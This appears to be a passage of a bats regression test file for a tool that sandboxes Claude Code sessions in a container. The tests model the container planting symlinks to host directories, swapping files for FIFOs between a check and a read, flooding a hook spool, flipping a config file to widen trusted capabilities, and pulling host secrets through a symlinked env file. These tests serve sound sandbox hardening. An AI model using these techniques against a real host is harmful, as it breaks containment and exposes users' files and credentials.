# the link named. The trash is now host-only, under $CLEAT_CONFIG_DIR.
@test "regression v1.5.4: a session delete followed a link the box planted in its trash" {
  local sdir="$HOME/.claude/projects/proj-deadbeef" now i
  local uuid="11111111-1111-2222-3333-444444444444"
  mkdir -p "$sdir/.cleat-trash" "$TEST_TEMP/hostdir"
  echo "transcript" > "$sdir/${uuid}.jsonl"
  now="$(date +%s)"
  for i in 0 1 2 3 4 5; do
    ln -s "$TEST_TEMP/hostdir" "$sdir/.cleat-trash/$(( now + i ))-${uuid}"
  done
  run _sessions_trash "$sdir" "$uuid" "$TEST_TEMP/proj" "cleat-x"
  assert_success
  run ls -A "$TEST_TEMP/hostdir"
  assert_output ""
  run cat "$CLEAT_CONFIG_DIR/session-trash/proj-deadbeef/"*"-${uuid}/${uuid}.jsonl"
  assert_output "transcript"
}

# v1.5.4: restore checked the session's name and then renamed onto it, inside
# the session dir the box mounts. A link to a host directory planted at the name
# between the check and the move made mv move the trashed sidecar into that
# directory. Restore now names the session DIRECTORY with mv -n, which never
# descends into a planted final name.
@test "regression v1.5.4: a session restore moved through a link the box planted at the session name" {
  local sdir="$HOME/.claude/projects/proj-deadbeef"
  local uuid="11111111-1111-2222-3333-444444444444"
  local entry="$CLEAT_CONFIG_DIR/session-trash/proj-deadbeef/100-${uuid}"
  mkdir -p "$sdir" "$entry/$uuid" "$TEST_TEMP/hostdir"
  echo "t" > "$entry/${uuid}.jsonl"
  echo "sidecar" > "$entry/$uuid/marker"
  # mv stands in for the box winning the window after the check. It plants the
  # link only when the sidecar moves, so the glob order of the two items does
  # not decide whether the check before the move already saw it.
  mv() {
    case "$* " in
      *"/$uuid "*) [ -L "$sdir/$uuid" ] || ln -s "$TEST_TEMP/hostdir" "$sdir/$uuid" ;;
    esac
    command mv "$@"
  }
  run _sessions_restore "$sdir" "$uuid"
  unset -f mv
  run ls -A "$TEST_TEMP/hostdir"
  assert_output ""
  run cat "$entry/$uuid/marker"
  assert_output "sidecar"
}

# v1.5.4: the first trash operation carries an old <key>/.cleat-trash out to the
# host-only trash. That tree is the box's, so it can be a link to any host
# directory. The carry-out renames the link and drops it, it never walks it.
@test "regression v1.5.4: the old in-mount trash was unpacked through a link the box planted" {
  local sdir="$HOME/.claude/projects/proj-deadbeef"
  local uuid="11111111-1111-2222-3333-444444444444"
  mkdir -p "$sdir" "$TEST_TEMP/hostdir/100-${uuid}"
  echo "not the box's" > "$TEST_TEMP/hostdir/100-${uuid}/${uuid}.jsonl"
  ln -s "$TEST_TEMP/hostdir" "$sdir/.cleat-trash"
  run _sessions_trash_count "$sdir"
  assert_output "0"
  run cat "$TEST_TEMP/hostdir/100-${uuid}/${uuid}.jsonl"
  assert_output "not the box's"
  run test -e "$CLEAT_CONFIG_DIR/session-trash/proj-deadbeef/100-${uuid}"
  assert_failure
  run test -L "$sdir/.cleat-trash"
  assert_failure
}

# v1.5.4: a delete created its trash entry with mkdir -p, which walks through a
# link to a directory. A link can still reach the host-only trash under an entry
# name (a box descriptor held across the carry-out of an old trash), and the
# delete then moved the transcript through it. The entry is now created with a
# plain mkdir, so an existing name refuses the delete and nothing moves.
@test "regression v1.5.4: a session delete wrote through a link already at its trash entry name" {
  local sdir="$HOME/.claude/projects/proj-deadbeef" now i
  local uuid="11111111-1111-2222-3333-444444444444"
  local trash="$CLEAT_CONFIG_DIR/session-trash/proj-deadbeef"
  mkdir -p "$sdir" "$trash" "$TEST_TEMP/hostdir"
  echo "transcript" > "$sdir/${uuid}.jsonl"
  now="$(date +%s)"
  for i in 0 1 2 3 4 5; do
    ln -s "$TEST_TEMP/hostdir" "$trash/$(( now + i ))-${uuid}"
  done
  run _sessions_trash "$sdir" "$uuid" "$TEST_TEMP/proj" "cleat-x"
  assert_failure 2
  run ls -A "$TEST_TEMP/hostdir"
  assert_output ""
  run cat "$sdir/${uuid}.jsonl"
  assert_output "transcript"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.4: the hook bridge's liveness marker lived in hooks/, the box's own
# read-write mount, and the reader trusted any regular .bridge.<pid> there that
# named a live pid. A marker the box planted made every session believe a bridge
# was already running, so no bridge started and no host hook ever ran while the
# summary still listed the cap. The markers now live in the host-only
# hookbridge/ beside it.
@test "regression v1.5.4: a bridge marker the box planted in its hooks mount stood the hook bridge down" {
  command -v jq >/dev/null 2>&1 || skip "the bridge branch needs jq on the host"
  echo '{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"true"}]}]}}' > "$HOME/.claude/settings.json"
  ACTIVE_CAPS=(hooks)
  _host_open_cmd() { echo ""; }
  local cname="test-planted-mark" rec="$TEST_TEMP/bridge_started"
  mkdir -p "$CLEAT_RUN_DIR/$cname/hooks"
  # The test's own pid, which is alive, as the box would name any live pid.
  : > "$CLEAT_RUN_DIR/$cname/hooks/.bridge.$$"
  # The bridge is spawned in the background, so it leaves a record and
  # exec_claude is held at the next step until the record exists. Bounded, so a
  # bridge that never spawns fails rather than hangs.
  _hook_bridge_watcher() { : > "$rec"; }
  _wait_for_coder_remap() {
    local i=0
    while [ ! -f "$rec" ] && [ "$i" -lt 50 ]; do sleep 0.1; i=$((i + 1)); done
  }
  run exec_claude "$cname" --dangerously-skip-permissions
  run test -f "$rec"
  assert_success
}

# v1.5.4: the marker was written with a plain redirect into the same read-write
# mount. A dangling link the box left at hooks/.bridge.<pid> made the host
# create an empty file at a host path the box picked, and a FIFO there hung the
# session start. The writer now puts the marker in hookbridge/, where the reader
# looks, and never writes through a name in the box's mount.
@test "regression v1.5.4: the bridge marker was written through a link the box planted in its hooks mount" {
  command -v jq >/dev/null 2>&1 || skip "the bridge branch needs jq on the host"
  echo '{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"true"}]}]}}' > "$HOME/.claude/settings.json"
  ACTIVE_CAPS=(hooks)
  _host_open_cmd() { echo ""; }
  local cname="test-marker-link" rec="$TEST_TEMP/bridge_seen"
  mkdir -p "$CLEAT_RUN_DIR/$cname/hooks" "$TEST_TEMP/outside"
  ln -s "$TEST_TEMP/outside/made-by-host" "$CLEAT_RUN_DIR/$cname/hooks/.bridge.$$"
  # What the next terminal on this box would see once this bridge is up.
  _hook_bridge_watcher() {
    if _box_hook_bridge_live "$3"; then echo live; else echo absent; fi > "$rec.part"
    mv "$rec.part" "$rec"
  }
  _wait_for_coder_remap() {
    local i=0
    while [ ! -f "$rec" ] && [ "$i" -lt 50 ]; do sleep 0.1; i=$((i + 1)); done
  }
  run exec_claude "$cname" --dangerously-skip-permissions
  run test -e "$TEST_TEMP/outside/made-by-host"
  assert_failure
  run cat "$rec"
  assert_output "live"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.4: the hook spool had no bound. The box appends to it through the
# read-write hooks mount and the bridge only ever read forward, so a box with
# project hooks queued host disk without limit for as long as it lived. The
# spool is grown past the cap AFTER the bridge's start pass, so only the
# per-poll claim can catch it: a spool planted before the start is claimed by
# the start call and would pass a build with no per-poll call.
@test "regression v1.5.4: the hook spool grew without bound" {
  _HOOK_SPOOL_MAX=200
  local spool="$CLEAT_RUN_DIR/box-a/hooks/events.jsonl" bpid i
  mkdir -p "${spool%/*}"
  : > "$spool"
  _hook_bridge_watcher "$spool" "$TEST_TEMP" "box-a" >/dev/null 2>&1 &
  bpid=$!
  sleep 0.7
  # One event past the cap. Its translation is the only work the pass does.
  printf '{"hook_event_name":"Stop","pad":"%s"}\n' "$(head -c 250 /dev/zero | tr '\0' 'x')" >> "$spool"
  i=0
  while [ -e "$spool" ] && [ "$i" -lt 60 ]; do sleep 0.5; i=$((i+1)); done
  kill "$bpid" 2>/dev/null || true
  wait "$bpid" 2>/dev/null || true
  run test -e "$spool"
  assert_failure
  run ls -A "$CLEAT_RUN_DIR/box-a/hookclaim"
  assert_output ""
}

# v1.5.4: and with no bridge at all (no host hook, no jq, or a shell or login
# session) nothing read the spool, so it kept every byte the box queued for the
# life of the box. Every session entry now bounds it: start, resume, claude,
# shell and login.
@test "regression v1.5.4: a hooks box with no bridge kept its spool for its whole life" {
  # The cap is on, a project hook forwards into the spool, the host has no hook
  # of its own, so no bridge ever starts to read what the box queues.
  printf '[caps]\nhooks\n' > "$CLEAT_GLOBAL_CONFIG"
  : > "$HOME/.claude/settings.json"
  _host_open_cmd() { echo ""; }
  _HOOK_SPOOL_MAX=100
  mkdir -p "$TEST_TEMP/project/.claude"
  printf '{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"true"}]}]}}\n' \
    > "$TEST_TEMP/project/.claude/settings.json"
  local cname spool
  cname="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_ps "$cname"
  spool="$CLEAT_RUN_DIR/$cname/hooks/events.jsonl"
  mkdir -p "${spool%/*}"
  head -c 150 /dev/zero | tr '\0' 'x' > "$spool"
  run cmd_shell "$TEST_TEMP/project"
  assert_success
  assert_output --partial "Discarded"
  run test -e "$spool"
  assert_failure
  run cat "$CLEAT_STATE_DIR/hook-drops.log"
  assert_output --partial "	spool	$cname	"
  # The same pass runs at a login and at a Claude session.
  head -c 150 /dev/zero | tr '\0' 'x' > "$spool"
  run cmd_login "$TEST_TEMP/project"
  assert_output --partial "Discarded"
  run test -e "$spool"
  assert_failure
  head -c 150 /dev/zero | tr '\0' 'x' > "$spool"
  resolve_caps "$TEST_TEMP/project"
  run exec_claude "$cname" --dangerously-skip-permissions
  assert_output --partial "Discarded"
  run test -e "$spool"
  assert_failure
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.4: a rotated hook drop log silenced the session-end report. The log
# rotates past 1 MiB, and the report tailed from an offset captured before the
# session. A rotation done by the bridge, which runs in the background, never
# reset that offset, so it pointed past the end of the new file and the drops
# of the rest of the session were never reported.
@test "regression v1.5.4: a rotated hook drop log silenced the session-end report" {
  mkdir -p "$CLEAT_STATE_DIR"
  printf 'now\t%s\tjson\tbox-a\tmd5\t0\ttext\n' "$_HOOK_DROP_MARK" > "$CLEAT_STATE_DIR/hook-drops.log"
  run _maybe_report_hook_drops "$CLEAT_STATE_DIR/hook-drops.log" 5000 box-a
  assert_success
  assert_output --partial "Dropped"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.4: host readers of names the box can write. .cleat, .cleat.env, a [setup]
# script, the hook spool and the session-end logs all sit in a mount the box
# writes. A FIFO there blocks open(2) until something writes to it, a link to
# /dev/zero never reaches EOF, and the box can swap either in after a check.
# Sizes now come from a stat and content from _read_bounded.
#
# Helpers. _rd_start runs a command in the background in a process group of
# its own. _rd_wait_pid waits for it to end, and after the deadline kills the
# whole group (a subshell stuck on a FIFO or spinning on /dev/zero included),
# hands the FIFO a writer and leaves a regular file at its name. Nothing a
# reverted fix left blocked may outlive the test, because it would hold bats'
# descriptors and hang the file. _rd_swap_on_open puts stand-ins for head,
# tail and cat on PATH. The first one handed <target> as its last argument
# swaps that name for a FIFO and then execs the real tool, which is the instant
# between Cleat's check and its open, made deterministic. It records that it
# fired, so a reader that never reached the tools cannot pass by reading
# nothing.
_rd_start() {
  set -m
  "$@" </dev/null >"$TEST_TEMP/rd.out" 2>&1 3>&- &
  _RD_PID=$!
  set +m
}

_rd_wait_pid() {
  local secs="$1" pid="$2" fifo="${3:-}" i=0 n st
  n=$(( secs * 10 ))
  while [ "$i" -lt "$n" ]; do
    kill -0 "$pid" 2>/dev/null || { wait "$pid" 2>/dev/null; return 0; }
    st="$(_proc_state "$pid")"
    case "$st" in Z*) wait "$pid" 2>/dev/null; return 0 ;; esac
    sleep 0.1
    i=$(( i + 1 ))
  done
  kill -9 -- "-$pid" 2>/dev/null || true
  kill -9 "$pid" 2>/dev/null || true
  if [ -n "$fifo" ] && [ -p "$fifo" ]; then
    exec 4<>"$fifo"
    rm -f "$fifo"
    : > "$fifo"
    exec 4>&-
  fi
  wait "$pid" 2>/dev/null || true
  return 1
}

_rd_finishes_within() {
  local secs="$1" fifo="$2"
  shift 2
  _rd_start "$@"
  _rd_wait_pid "$secs" "$_RD_PID" "$fifo"
}

_rd_swap_on_open() {
  local target="$1" d t real
  [ -n "${_RD_ORIG_PATH:-}" ] || _RD_ORIG_PATH="$PATH"
  d="$(mktemp -d "$TEST_TEMP/swap.XXXXXX")"
  for t in head tail cat; do
    real="$(PATH="$_RD_ORIG_PATH"; command -v "$t")"
    cat > "$d/$t" <<EOF
#!/bin/sh
for a in "\$@"; do last="\$a"; done
if [ "\$last" = "$target" ] && mkdir "$d/fired" 2>/dev/null; then
  rm -f "$target"
  mkfifo "$target"
fi
exec "$real" "\$@"
EOF
    chmod +x "$d/$t"
  done
  PATH="$d:$_RD_ORIG_PATH"
  _RD_SWAP_DIR="$d"
}

# A FIFO .cleat reached the launch fingerprint, which reads [resources] with no
# -f gate and no trust check, and hung every launch of the project until
# Ctrl-C. No race needed. A link to /dev/zero spun instead.
@test "regression v1.5.4: a FIFO or device .cleat does not hang the launch fingerprint" {
  local p="$TEST_TEMP/fp-proj" want
  mkdir -p "$p"
  ACTIVE_CAPS=()
  _RESOLVED_ENV_ARGS=()
  want="$(compute_config_fingerprint "$p")"
  mkfifo "$p/.cleat"
  _rd_finishes_within 5 "$p/.cleat" compute_config_fingerprint "$p" \
    || fail "the launch fingerprint blocked on a FIFO .cleat"
  run cat "$TEST_TEMP/rd.out"
  assert_output "$want"
  rm -f "$p/.cleat"
  ln -s /dev/zero "$p/.cleat"
  _rd_finishes_within 5 "" compute_config_fingerprint "$p" \
    || fail "the launch fingerprint never finished reading a .cleat linked to /dev/zero"
  run cat "$TEST_TEMP/rd.out"
  assert_output "$want"
}

# The other .cleat and .cleat.env readers had the same -r-only gate.
@test "regression v1.5.4: no .cleat reader opens a FIFO" {
  local p="$TEST_TEMP/fifo-proj"
  mkdir -p "$p"
  mkfifo "$p/.cleat" "$p/.cleat.env"
  _rd_finishes_within 3 "$p/.cleat" _cleat_section_present "$p/.cleat" caps \
    || fail "_cleat_section_present opened the FIFO"
  _rd_finishes_within 3 "$p/.cleat" _read_caps_from_file "$p/.cleat" \
    || fail "_read_caps_from_file opened the FIFO"
  _rd_finishes_within 3 "$p/.cleat" _read_setup_from_file "$p/.cleat" \
    || fail "_read_setup_from_file opened the FIFO"
  _rd_finishes_within 3 "$p/.cleat" _read_section_all_from_file "$p/.cleat" fork exclude \
    || fail "_read_section_all_from_file opened the FIFO"
  _rd_finishes_within 3 "$p/.cleat" _warn_unknown_cleat_sections "$p/.cleat" project \
    || fail "_warn_unknown_cleat_sections opened the FIFO"
  _rd_finishes_within 3 "$p/.cleat.env" _parse_env_file "$p/.cleat.env" \
    || fail "_parse_env_file opened the FIFO"
}

# A regular .cleat passes the gate, and the box swaps a FIFO in before the read.
@test "regression v1.5.4: a .cleat swapped for a FIFO after its check is read under a time bound" {
  local p="$TEST_TEMP/swap-proj"
  mkdir -p "$p"
  printf '[caps]\ngit\n' > "$p/.cleat"
  _BOX_FILE_READ_SECS=1
  _rd_swap_on_open "$p/.cleat"
  _rd_finishes_within 8 "$p/.cleat" _read_caps_from_file "$p/.cleat" \
    || fail "the read of a .cleat swapped for a FIFO was not bounded"
  run test -d "$_RD_SWAP_DIR/fired"
  assert_success
}

# The script passed -f, -L and the containment checks, then `cat` opened
# whatever the box had put at the name by then.
@test "regression v1.5.4: a setup script swapped for a FIFO after its checks does not hang the payload" {
  local p="$TEST_TEMP/setup-proj"
  mkdir -p "$p"
  printf '[setup]\nscript provision.sh\n' > "$p/.cleat"
  printf 'echo provisioned\n' > "$p/provision.sh"
  _BOX_FILE_READ_SECS=1
  _rd_swap_on_open "$p/provision.sh"
  _rd_finishes_within 8 "$p/provision.sh" _build_setup_payload "$p" main \
    || fail "the setup payload blocked on a script swapped for a FIFO"
  run test -d "$_RD_SWAP_DIR/fired"
  assert_success
}

# Refused whole, before a byte of it is read, rather than cut at the read bound.
@test "regression v1.5.4: a setup script over 1 MiB is refused before it is read" {
  local p="$TEST_TEMP/big-proj"
  mkdir -p "$p"
  printf '[setup]\nscript big.sh\n' > "$p/.cleat"
  head -c 1048577 /dev/zero | tr '\0' '#' > "$p/big.sh"
  run _build_setup_payload "$p" main
  assert_failure
  assert_output --partial "larger than 1 MiB"
  refute_output --partial "# cleat setup: begin script"
}

# The bridge sized the spool with `wc -c <`, which opens it. A FIFO swapped in
# blocked that open, and bash holds the session-end TERM while a command
# substitution waits, so the bridge outlived its session. The loop's size read
# now comes before its shape check, so this swap needs no race. The start offset
# is read after the start pass, which stands in for a swap won there.
@test "regression v1.5.4: the hook bridge sizes its spool without opening it" {
  local spool="$CLEAT_RUN_DIR/box-a/hooks/events.jsonl" bpid
  mkdir -p "${spool%/*}"
  : > "$spool"
  _rd_start _hook_bridge_watcher "$spool" "$TEST_TEMP" "box-a"
  bpid=$_RD_PID
  sleep 1.2
  rm -f "$spool"
  mkfifo "$spool"
  _rd_wait_pid 4 "$bpid" "$spool" || fail "the bridge opened a FIFO swapped in for its spool"
  run test -p "$spool"
  assert_failure
  : > "$spool"
  _hook_spool_cap() { rm -f "$1"; mkfifo "$1"; return 1; }
  _rd_start _hook_bridge_watcher "$spool" "$TEST_TEMP" "box-a"
  bpid=$_RD_PID
  _rd_wait_pid 4 "$bpid" "$spool" || fail "the bridge opened the spool to size its start offset"
  run test -p "$spool"
  assert_failure
}

# And the window read, a tail from the offset. The spool starts with one line
# from a prior session, so the window starts past byte 1 and the tail branch
# of the bounded read is the one that opens.
@test "regression v1.5.4: a hook spool swapped for a FIFO before the window read does not wedge the bridge" {
  local spool="$CLEAT_RUN_DIR/box-a/hooks/events.jsonl" bpid
  mkdir -p "${spool%/*}"
  printf '{"hook_event_name":"Stop"}\n' > "$spool"
  _BOX_FILE_READ_SECS=1
  # Before the bridge starts, which takes PATH with it.
  _rd_swap_on_open "$spool"
  _rd_start _hook_bridge_watcher "$spool" "$TEST_TEMP" "box-a"
  bpid=$_RD_PID
  sleep 1.2
  printf '{"hook_event_name":"Stop"}\n' >> "$spool"
  _rd_wait_pid 8 "$bpid" "$spool" || fail "the bridge wedged on a spool swapped for a FIFO before its read"
  run test -d "$_RD_SWAP_DIR/fired"
  assert_success
  run test -p "$spool"
  assert_failure
}

# The session-end reports read .watcher-log and .proxy-log in the clip dir the
# box mounts read-write. `[ -f ]` follows a link, so a link there made them read
# a host file. Only a yes or no or a count came of it, but it is never Cleat's.
# Both logs have since moved to host-only dirs (bridge/ and logs/). The guards
# stay as a second layer, so these still hand the reports a clip path.
@test "regression v1.5.4: session-end reports never follow a link planted as their log" {
  local clip="$TEST_TEMP/clip-links" host="$TEST_TEMP/host-log"
  mkdir -p "$clip"
  {
    echo "bash: fork: retry: Resource temporarily unavailable"
    echo "[browser-watcher 12:00:00] ${_BROWSER_BLOCKED_MARK} origin=blocked.example url=https://blocked.example/a"
    echo "[browser-watcher 12:00:00] ${_BROWSER_CAPPED_MARK} limit=${_BROWSER_RATE_PER_MIN}/min,${_BROWSER_RATE_PER_SESSION}/session url=https://capped.example/b"
    echo "[browser-watcher 12:00:00] ${_BROWSER_NOBIND_MARK} deferring URL to terminal (callback port unavailable) url=https://nobind.example/c"
  } > "$host"
  # The same lines as regular logs are reported, so the lines match.
  cp "$host" "$clip/.watcher-log"
  cp "$host" "$clip/.proxy-log"
  run _maybe_explain_fork_exhaustion "$clip/.watcher-log" 0
  assert_output --partial "process slots"
  run _maybe_report_blocked_opens "$clip/.proxy-log" 0
  assert_output --partial "blocked.example"
  assert_output --partial "capped.example"
  assert_output --partial "nobind.example"
  rm -f "$clip/.watcher-log" "$clip/.proxy-log"
  ln -s "$host" "$clip/.watcher-log"
  ln -s "$host" "$clip/.proxy-log"
  run _maybe_explain_fork_exhaustion "$clip/.watcher-log" 0
  assert_success
  assert_output ""
  run _maybe_report_capped_opens "$clip/.proxy-log" 0
  assert_success
  assert_output ""
  run _maybe_report_nobind_opens "$clip/.proxy-log" 0
  assert_success
  assert_output ""
  run _maybe_report_blocked_opens "$clip/.proxy-log" 0
  assert_success
  assert_output ""
}

# And a FIFO swapped in after that check blocked the report's tail, which runs
# at session end after the box has had the whole session to set it up.
@test "regression v1.5.4: session-end reports do not hang on a log swapped for a FIFO after the check" {
  local clip="$TEST_TEMP/clip-swap"
  mkdir -p "$clip"
  _BOX_FILE_READ_SECS=1
  # From the start of the log, the head branch.
  echo "prior" > "$clip/.watcher-log"
  _rd_swap_on_open "$clip/.watcher-log"
  _rd_finishes_within 6 "$clip/.watcher-log" _maybe_explain_fork_exhaustion "$clip/.watcher-log" 0 \
    || fail "the fork report blocked on a swapped log"
  run test -d "$_RD_SWAP_DIR/fired"
  assert_success
  # From past a prior session's line, the tail branch.
  rm -f "$clip/.proxy-log"; echo "prior" > "$clip/.proxy-log"; echo "now" >> "$clip/.proxy-log"
  _rd_swap_on_open "$clip/.proxy-log"
  _rd_finishes_within 6 "$clip/.proxy-log" _maybe_report_capped_opens "$clip/.proxy-log" 6 \
    || fail "the rate cap report blocked on a swapped log"
  run test -d "$_RD_SWAP_DIR/fired"
  assert_success
  rm -f "$clip/.proxy-log"; echo "prior" > "$clip/.proxy-log"; echo "now" >> "$clip/.proxy-log"
  _rd_swap_on_open "$clip/.proxy-log"
  _rd_finishes_within 6 "$clip/.proxy-log" _maybe_report_nobind_opens "$clip/.proxy-log" 6 \
    || fail "the busy callback port report blocked on a swapped log"
  run test -d "$_RD_SWAP_DIR/fired"
  assert_success
  # The refusal report's own read, with the two reports it calls first quiet.
  rm -f "$clip/.proxy-log"; echo "prior" > "$clip/.proxy-log"; echo "now" >> "$clip/.proxy-log"
  _maybe_report_capped_opens() { :; }
  _maybe_report_nobind_opens() { :; }
  _rd_swap_on_open "$clip/.proxy-log"
  _rd_finishes_within 6 "$clip/.proxy-log" _maybe_report_blocked_opens "$clip/.proxy-log" 6 \
    || fail "the refusal report blocked on a swapped log"
  run test -d "$_RD_SWAP_DIR/fired"
  assert_success
}

# ── v1.5.4: one read decides the project caps ────────────────────────────────
#
# resolve_caps applied the caps from its own read of .cleat, while the trust
# check hashed a second read, the prompt listed a third and recorded the hash of
# a fourth. .cleat sits in /workspace, so the box can flip it between any two.
# Every test here models that flip at the exact point one read used to happen.

# The trust lookup stands in for the moment between resolve_caps' read and the
# check's own: the box puts back the file the user trusted.
@test "regression v1.5.4: project caps apply from the same read the trust check hashed" {
  unset CLEAT_TRUST_PROJECT
  local p="$TEST_TEMP/sameread" h
  mkdir -p "$p"
  printf '[caps]\ngit\n' > "$p/.cleat"
  h="$(_hash_cleat_caps "$p/.cleat" main)"
  _trust_record "$p" "$h" main
  printf '[caps]\ngit\ndocker\n' > "$p/.cleat"
  _SAMEREAD_H="$h"
  _trust_lookup() { printf '[caps]\ngit\n' > "$1/.cleat"; printf '%s\n' "$_SAMEREAD_H"; }
  _is_tty() { return 1; }
  _BOX=main
  resolve_caps "$p" > "$TEST_TEMP/sameread.out" 2>&1
  run cap_is_active docker
  assert_failure
}

# cmd_start resolves caps, then a recreate through cmd_run resolves them again
# in the same process. The session cache held a bare "approved".
@test "regression v1.5.4: an in-process approval does not carry over to a rewritten .cleat" {
  unset CLEAT_TRUST_PROJECT
  local p="$TEST_TEMP/sesscache"
  mkdir -p "$p"
  printf '[caps]\ngit\n' > "$p/.cleat"
  _trust_record "$p" "$(_hash_cleat_caps "$p/.cleat" main)" main
  _is_tty() { return 1; }
  _BOX=main
  resolve_caps "$p" > "$TEST_TEMP/sesscache.1" 2>&1
  run cap_is_active git
  assert_success
  printf '[caps]\ngit\ndocker\n' > "$p/.cleat"
  resolve_caps "$p" > "$TEST_TEMP/sesscache.2" 2>&1
  run cap_is_active docker
  assert_failure
}

# The prompt listed one read and recorded the hash of another, taken just
# before it. The hash function stands in for that second read.
@test "regression v1.5.4: the trust prompt records the caps it showed, not a second read" {
  unset CLEAT_TRUST_PROJECT
  local p="$TEST_TEMP/shown" ben
  mkdir -p "$p"
  printf '[caps]\ngit\n' > "$p/.cleat"
  ben="$(_hash_cleat_caps "$p/.cleat" main)"
  eval "_real_hash_cleat_caps() $(declare -f _hash_cleat_caps | sed 1d)"
  _hash_cleat_caps() { printf '[caps]\ngit\ndocker\n' > "$1"; _real_hash_cleat_caps "$@"; }
  _is_tty() { return 0; }
  _SHOWN_OUT="$TEST_TEMP/shown.caps"
  _trust_prompt() { shift; printf '%s\n' "$@" > "$_SHOWN_OUT"; return 0; }
  _BOX=main
  resolve_caps "$p" > "$TEST_TEMP/shown.out" 2>&1
  run cat "$_SHOWN_OUT"
  assert_output "git"
  run _trust_lookup "$p" main
  assert_output "$ben"
}

# cmd_trust hashed one read and printed "Approved caps" from a later one, so it
# could tell the user it approved git while recording git and docker.
@test "regression v1.5.4: cleat trust prints the caps it records" {
  local p="$TEST_TEMP/trustprint" hmal
  mkdir -p "$p"
  printf '[caps]\ngit\ndocker\n' > "$p/.cleat"
  hmal="$(_hash_cleat_caps "$p/.cleat" main)"
  _TRUSTPRINT_P="$p"
  _build_setup_payload() { printf '[caps]\ngit\n' > "$_TRUSTPRINT_P/.cleat"; }
  run cmd_trust "$p"
  assert_success
  assert_output --partial "Approved caps: docker,git"
  run _trust_lookup "$p" main
  assert_output "$hmal"
}

# One line `docker,git` is no cap at all, yet it hashed exactly like the two
# lines docker and git, so approving the inert line trusted the real pair.
@test "regression v1.5.4: an approved inert cap line cannot later stand for real caps" {
  unset CLEAT_TRUST_PROJECT
  local p="$TEST_TEMP/inert"
  mkdir -p "$p"
  printf '[caps]\ndocker,git\n' > "$p/.cleat"
  _is_tty() { return 0; }
  _trust_prompt() { return 0; }
  _BOX=main
  resolve_caps "$p" > "$TEST_TEMP/inert.1" 2>&1
  printf '[caps]\ndocker\ngit\n' > "$p/.cleat"
  _TRUST_SESSION_DECISION=""
  _TRUST_SESSION_PROJECT=""
  _TRUST_SESSION_BOX=""
  _is_tty() { return 1; }
  resolve_caps "$p" > "$TEST_TEMP/inert.2" 2>&1
  run cap_is_active docker
  assert_failure
}

# ── v1.5.4: bare names in a project env file behind trust ───────────────────
#
# A bare KEY line in .cleat.env (or .cleat.<box>.env) copied the host's value
# of KEY into the box with no approval at all. The file sits in /workspace, so
# the box, or a cloned repo, picked which host secrets left the shell. The set
# of bare names now joins the project trust decision.

# The box writes the name of a host secret into .cleat.env. Non-TTY, no opt-in.
@test "regression v1.5.4: a project env file cannot copy a host variable into an untrusted box" {
  unset CLEAT_TRUST_PROJECT
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  printf '[caps]\nenv\n' > "$CLEAT_GLOBAL_CONFIG"
  export CLEAT_R154_HOST_SECRET=host-only-value
  printf 'CLEAT_R154_HOST_SECRET\nLITERAL_OK=1\n' > "$TEST_TEMP/project/.cleat.env"
  _is_tty() { return 1; }
  run cmd_run "$TEST_TEMP/project"
  unset CLEAT_R154_HOST_SECRET
  assert_success
  assert_output --partial "Not passing the host variables"
  assert_output --partial "CLEAT_R154_HOST_SECRET"
  run assert_docker_run_has "$cname" "LITERAL_OK=1"
  assert_success
  run grep -q host-only-value "$DOCKER_CALLS"
  assert_failure
}

# An approval covers the names it was given for. The box adds one more.
@test "regression v1.5.4: a new host variable in the project env file needs fresh approval" {
  local p="$TEST_TEMP/project"
  mkdir -p "$p"
  printf '[caps]\nenv\n' > "$CLEAT_GLOBAL_CONFIG"
  printf 'R154_FIRST\n' > "$p/.cleat.env"
  export R154_FIRST=first-value R154_SECOND=second-value
  _is_tty() { return 1; }
  _BOX=main
  export CLEAT_TRUST_PROJECT=1
  resolve_caps "$p" > "$TEST_TEMP/fresh.1" 2>&1
  resolve_env_args "$p" >> "$TEST_TEMP/fresh.1" 2>&1
  run printf '%s\n' "${_RESOLVED_ENV_ARGS[@]+"${_RESOLVED_ENV_ARGS[@]}"}"
  assert_output --partial "R154_FIRST=first-value"
  unset CLEAT_TRUST_PROJECT
  _TRUST_SESSION_DECISION=""
  printf 'R154_FIRST\nR154_SECOND\n' > "$p/.cleat.env"
  resolve_caps "$p" > "$TEST_TEMP/fresh.2" 2>&1
  resolve_env_args "$p" >> "$TEST_TEMP/fresh.2" 2>&1
  run printf '%s\n' "${_RESOLVED_ENV_ARGS[@]+"${_RESOLVED_ENV_ARGS[@]}"}"
  unset R154_FIRST R154_SECOND
  refute_output --partial "second-value"
  run cat "$TEST_TEMP/fresh.2"
  assert_output --partial "R154_SECOND"
}

# Folding the names in must not re-prompt the projects that ask for none: their
# trust rows were written by v1.5.3 over the caps alone.
@test "regression v1.5.4: a project env file with no host variables keeps its trust hash" {
  unset CLEAT_TRUST_PROJECT
  local p="$TEST_TEMP/project"
  mkdir -p "$p"
  printf '[caps]\ngit\nenv\n' > "$p/.cleat"
  printf 'LITERAL_ONLY=1\n# COMMENTED_NAME\n' > "$p/.cleat.env"
  _trust_record "$p" "$(printf 'env,git' | _md5 | awk '{print $1}')" main
  _is_tty() { return 1; }
  _BOX=main
  resolve_caps "$p" > "$TEST_TEMP/stable.out" 2>&1
  run cap_is_active git
  assert_success
  run cat "$TEST_TEMP/stable.out"
  refute_output --partial "skipped"
  refute_output --partial "not trusted"
}

# Git stores symlinks, so a cloned repo can ship .cleat.env pointing at any
# file the user can read. Relative on purpose: that is the shape a clone brings.
@test "regression v1.5.4: a symlinked project env file is not read" {
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project" "$TEST_TEMP/hostdir"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  printf '[caps]\nenv\n' > "$CLEAT_GLOBAL_CONFIG"
  printf 'aws_secret_access_key = host-file-secret\nexport R154_RC=rc-secret\n' > "$TEST_TEMP/hostdir/credentials"
  ln -s ../hostdir/credentials "$TEST_TEMP/project/.cleat.env"
  printf 'GLOBAL_OK=1\n' > "$CLEAT_GLOBAL_ENV"
